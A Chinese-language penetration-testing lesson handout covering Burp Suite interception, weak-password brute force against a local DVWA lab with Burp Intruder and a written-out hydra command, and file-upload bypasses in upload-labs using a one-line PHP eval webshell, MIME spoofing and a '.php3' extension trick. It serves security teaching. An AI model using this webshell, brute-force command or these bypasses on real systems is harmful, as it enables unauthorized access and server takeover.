# D4 Web 渗透入门：Burp + 弱口令 + 文件上传（导师讲义）

> 日期：2026-10-04 ｜ 对应大纲 Day 4（原 D4+D5 合并）｜ 主线：Burp Suite → 弱口令爆破 → 文件上传漏洞
> 今天的产出：**用 Burp 改包、爆破一次弱口令、过 upload-labs 前三关**
> 环境：DVWA(8081)、upload-labs(8082) 都在跑；Burp 装在 /Applications；hydra 已装

## 目录

1. [一 Web 请求快速回顾](#一-web-请求快速回顾)
2. [二 Burp Suite：Web 渗透的中枢](#二-burp-suiteweb-渗透的中枢)
3. [三 弱口令：原理 + 爆破](#三-弱口令原理--爆破)
4. [四 文件上传漏洞：原理 + upload-labs 前三关](#四-文件上传漏洞原理--upload-labs-前三关)
5. [五 实验清单](#五-实验清单)
6. [六 高频面试问答](#六-高频面试问答)

---

## 一 Web 请求快速回顾

D1/D2 讲过 HTTP，这里只补 Web 渗透需要的三个点：

1. **请求方法**：`GET`（参数在 URL 里 `?a=1&b=2`）、`POST`（参数在请求体里）。登录、上传用 POST。
2. **参数全在客户端可控**：URL、请求头、Cookie、请求体 —— 你都能改。**"前端校验"永远不可信**，这是文件上传和弱口令的前提。
3. **Cookie/Session**：登录后服务器发你一个 `PHPSESSID`，之后每次请求带上它，服务器就认得你（D2 讲的重放）。

> Web 渗透的本质：**浏览器发什么，攻击者就能伪造什么**。Burp 就是把"浏览器发的请求"截下来、改一改、再发出去的工具。

---

## 二 Burp Suite：Web 渗透的中枢

Burp 是一个**代理**：浏览器 ↔ Burp ↔ 服务器。浏览器发的每个请求都先经过 Burp，你可以拦下来看、改、重发。

### 2.1 一次性配置（第一次用要做的）

1. 打开 Burp Suite Community → 选 **Temporary project** → **Use Burp defaults** → Start
2. Burp 默认监听 **127.0.0.1:8080**
3. 让浏览器走这个代理（两种方式任选）：
   - **用 Burp 自带的浏览器**：Burp 顶部 **Proxy → Intercept → 点「Open Browser」**（这个浏览器已自动配好代理，最省事）
   - 或手动给 Safari/Chrome 配代理 127.0.0.1:8080
4. 装 HTTPS 证书（访问 https 网站才需要；今天打 127.0.0.1 的 http 靶场可以跳过）：浏览器访问 `http://burp` → 下载 CA 证书 → 信任

### 2.2 拦截（Intercept）—— 抓包改包

1. Burp → **Proxy → Intercept**，确认 **Intercept is on**（按钮显示 on）
2. 浏览器访问 http://127.0.0.1:8081 ，你会看到请求**卡在 Burp 里**
3. 在 Burp 里改（比如改 Cookie、改参数）→ 点 **Forward**（放行）或 **Drop**（丢弃）
4. 练习：把 `Cookie: security=low` 改成 `security=high`，体会"客户端说 low 还是 high，服务器都信"

### 2.3 Repeater —— 反复重发一个请求

1. 在 Proxy 历史里，对某个请求**右键 → Send to Repeater**
2. 切到 **Repeater** 标签，随便改请求，点 **Send**，看右侧响应
3. 这是手工测试的利器：改一个参数 → 看响应变化 → 再改

### 2.4 Intruder —— 自动化爆破（弱口令就靠它）

1. 对登录请求 **右键 → Send to Intruder**
2. 在 **Positions** 标签，点 **Clear §**，再用鼠标选中要爆破的参数（如 password 的值），点 **Add §**，把它标记成变量
3. **Payloads** 标签 → 加载一个字典（或手动加几个）
4. 点 **Start attack** → 看每个请求的响应长度，**长度不同的那个多半就是成功**

> 判断爆破成功的信号：失败和成功的响应**长度不一样**（成功登录返回的页面更长/更短）。Intruder 里看 `Length` 列，找出与众不同的那一条。

---

## 三 弱口令：原理 + 爆破

### 3.1 原理

**弱口令 = 用户用了太常见、太好猜的密码**（`admin`、`123456`、`password`、`666666`…）。攻击者拿一个**字典**（常见密码清单）挨个试，试中了就登录成功。

- 字典来源：`rockyou.txt`（真实泄露的 1400 万密码，Kali 里有）、seclists、自己按社工信息生成（生日、姓名+数字）
- 防御：强密码策略 + **登录失败次数限制 + 验证码**（DVWA 的 brute 模块在 low 级别**没有任何限制**，所以能无限试）

### 3.2 靶场：DVWA 的 Brute Force 模块

DVWA 的 `/vulnerabilities/brute/` 是一个专门的弱口令靶场（low 级别无 CSRF、无频率限制）。我用 curl 实测过它的两种响应：

| 情况 | 服务器返回 |
|---|---|
| 密码正确（admin/password） | `Welcome to the password protected area admin` |
| 密码错误 | `Username and/or password incorrect.` |

### 3.3 爆破方式 A：Burp Intruder（推荐，GUI 直观）

1. 浏览器（走 Burp 代理）登录 DVWA，进到 Brute Force 页面
2. 随便输个密码点 Login，在 Burp Proxy 历史里找到这个 `GET /vulnerabilities/brute/?username=admin&password=xxx&Login=Login` 请求
3. **Send to Intruder** → 标记 `password=xxx` 的 xxx 为变量（§）
4. Payloads 加字典：`admin`、`123456`、`password`、`admin123`、`letmein`…
5. Start attack → 看 `Length` 列，找与众不同的那条 → 就是密码 `password`

### 3.4 爆破方式 B：hydra（命令行，进阶）

hydra 是命令行爆破工具，支持几十种协议。它比 Intruder 适合"脚本化/大规模"，但 Web 表单语法有点绕（**header 里的冒号要转义成 `\:`**）：

```bash
# 先登录 DVWA 拿到你的 PHPSESSID（浏览器 F12 → Application → Cookies 里看）
# 小字典（真跑前先造一个，别一上来用 1400 万的 rockyou）
printf 'admin\n123456\npassword\nadmin123\nletmein\n' > /tmp/pass.txt

hydra -l admin -P /tmp/pass.txt 127.0.0.1 http-get-form \
  "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: security=low; PHPSESSID=你的会话ID:F=incorrect" -f
```

> `-f` = 找到第一个就停；`F=incorrect` = 以"incorrect"为失败特征；`H=Cookie\: ...` = 带上登录态（**冒号必须转义 `\:`**，这是最容易踩的坑）。
> ⚠️ 这条是爆破命令，请**你自己在终端里跑**（打的是你自己的 DVWA）。

---

## 四 文件上传漏洞：原理 + upload-labs 前三关

### 4.1 原理

网站允许用户上传文件（头像、附件），但**没做好校验**，攻击者就能上传一个**网页木马（webshell）**——一个能执行命令的 PHP 文件。上传成功 = 拿到服务器命令执行权限。

一句话 webshell（先存成 `shell.php`）：

```php
<?php @eval($_POST['cmd']); ?>
```

上传后访问 `http://127.0.0.1:8082/upload/shell.php`，就能用工具（或写个 POST）执行系统命令。

**检测点**：服务器到底校验了什么？前端 JS？文件名后缀？Content-Type？文件内容？—— 校验点不同，绕过手法就不同。upload-labs 就是 21 个"校验点各不相同"的关卡。

### 4.2 Pass-01：前端 JS 校验（最弱）

真实源码：表单 `onsubmit="return checkFile()"` —— 校验在**浏览器里**做的，服务器根本没查。

**绕过**（任选其一）：
- 浏览器按 F12 → 把那个 JS 函数删了/禁用 JS → 直接上传
- 或 **Burp 抓包**：先选一个 `.jpg` 让前端通过，再用 Burp 把文件名改成 `shell.php` 再 Forward

### 4.3 Pass-02：MIME（Content-Type）校验

真实源码：
```php
if ($_FILES['upload_file']['type'] == 'image/jpeg' || ... 'image/png' || ... 'image/gif') {
```
它只检查请求头里的 **Content-Type**（MIME），不看后缀、不看内容。

**绕过**：Burp 抓包，把 `Content-Type: application/octet-stream` 改成 **`image/jpeg`** → Forward。文件后缀保持 `shell.php` 不变。

### 4.4 Pass-03：黑名单

真实源码：
```php
$deny_ext = array('.asp','.aspx','.php','.jsp');   // 黑名单
$file_ext = strrchr($file_name, '.');              // 取最后一个点之后
$file_ext = strtolower($file_ext);                  // 转小写
$file_ext = trim($file_ext);                        // 去空格
if(!in_array($file_ext, $deny_ext)) { ... }         // 不在黑名单就放行
```

它只黑名单了 `.php` 等 4 个后缀，**只要后缀不在黑名单里就放行**。

**绕过**：把文件名改成 `shell.php3`（或 `.phtml`、`.php5`、`.pht`）——Apache 同样会把它当 PHP 执行，但 `.php3` 不在黑名单里。

> 上传成功不代表能执行：要看 `upload/` 目录里的文件是否被服务器当 PHP 跑。Pass-03 的 `.php3` 能成功，是因为这台 upload-labs 的 Apache 配置了执行 `.php3/.phtml`。

---

## 五 实验清单

> 按顺序做，每步都有明确"成功标志"。

### 实验 1：Burp 拦截 + Repeater（约 15 分钟）

1. Burp → Open Browser → 访问 http://127.0.0.1:8081 ，拦截到第一个请求
2. 改 `Cookie: security=low` → `high`，Forward，看页面安全级别有没有变
3. 登录请求 **Send to Repeater**，改参数重发，观察响应

**成功标志**：能随手拦下一个请求、改一个字段、看响应变化。

### 实验 2：弱口令爆破（约 15 分钟）

用 3.3 的 Burp Intruder（或 3.4 的 hydra），爆破 DVWA Brute Force 模块，找到 admin 的密码。

**成功标志**：看到 `Welcome to the password protected area admin`，或 Intruder 里 Length 与众不同的那条 = `password`。

### 实验 3：文件上传前三关（约 30 分钟）

1. 建 `shell.php`（内容 `<?php @eval($_POST['cmd']); ?>`）
2. **Pass-01**：禁用 JS 或 Burp 改包，上传成功
3. **Pass-02**：Burp 改 Content-Type 为 image/jpeg，上传成功
4. **Pass-03**：改名 `shell.php3`，上传成功

**成功标志**：三个 Pass 都显示"上传成功"，且能访问到上传的文件路径（upload/ 目录下能看到你传的文件）。

---

## 六 高频面试问答

**Q：前端校验为什么靠不住？**
前端 JS 校验在浏览器里执行，攻击者直接绕过（禁用 JS / Burp 改包）。**所有客户端校验都只当提示，真正的校验必须在服务器端**。

**Q：文件上传漏洞的检测点有哪些？**
文件名后缀、Content-Type(MIME)、文件内容（文件头）、大小、图片二次渲染。检测点不同，绕过手法不同（改后缀 / 改 MIME / 伪造文件头 / 图片马）。

**Q：弱口令怎么防？**
强密码策略 + 登录失败锁定/限速 + 验证码 + 双因素认证。DVWA brute 模块 low 级别"无任何限制"，所以能被无限爆破。

**Q：Burp 的 Intercept / Repeater / Intruder 分别干什么？**
Intercept 拦下请求改包；Repeater 反复重发单个请求看响应；Intruder 自动化批量爆破（标记变量 + 字典）。

---

## 验收（做完实验再答）

1. 一句话解释 Burp 的工作原理（为什么它能"看到并修改"浏览器发的请求）。
2. 文件上传的三个绕过手法，分别对应哪个"检测点"被绕过（Pass-01/02/03）？
3. 弱口令爆破怎么判断"哪个密码是对的"？（提示：不看响应内容，看一个更快的信号）

---

## 环境踩坑（10/4 实测）

**坑 1：upload-labs 的 `upload/` 目录不存在**
上传时报「../upload 文件夹不存在，请手工创建」——这个镜像不自带该目录。
修法：compose 里给该 service 加 `command: sh -c "mkdir -p /var/www/html/upload && chmod 777 /var/www/html/upload && apache2-foreground"`。

**坑 2：`.php3` 上传成功却不执行（浏览器显示源码）**
镜像的 Apache 只配了 `<FilesMatch \.php$>` —— **只把 `.php` 交给 PHP**。所以 Pass-03 的 `.php3` 绕过后**能上传、不能执行**。
修法：加 `labs/upload-labs-ext.conf` 让 `.php3/.php4/.php5/.phtml/.pht` 也执行（compose 挂载进 `conf-enabled/`）。
**顺带收获**：这正是"**上传成功 ≠ 能执行**"的实证 —— 漏洞成立要两个条件同时满足：① 绕过上传检测 + ② 服务器会执行你的文件。

**坑 3：hydra 的 http-form header 转义**
`H=Cookie\: ...` 里的 `\:` 复制粘贴时容易丢，丢了 hydra 直接打印 usage（不报错，很坑）。用脚本 `scripts/dvwa-hydra.sh` 避免。

---

## 验收结果（10/4 作答）

**题 1 ✓**：Burp 是浏览器与服务器之间的**代理（中间人）**，流量都经过它，所以能看能改。（与 D2 的 MITM 同一位置，区别是 Burp 是你自愿装的。）

**题 2 ✓**：检测点答对，完整对应：
- Pass-01 校验**前端 JS**（浏览器里查后缀）→ 禁用 JS / Burp 把 `.jpg` 改回 `.php`
- Pass-02 校验 **Content-Type（MIME）**→ Burp 改成 `image/jpeg`
- Pass-03 校验**后缀黑名单**（`.asp/.aspx/.php/.jsp`）→ 改名 `.php3`

**题 3 ✓✓（今天最值钱）**：用**响应长度/状态码**这种快信号判断；**判据必须在"对/错"两种情况下取值不同，否则失效**。后半句正是当天 302 坑的总结 —— 所有响应都一样时，要回头查"请求有没有被正确处理"，而不是继续爆破。
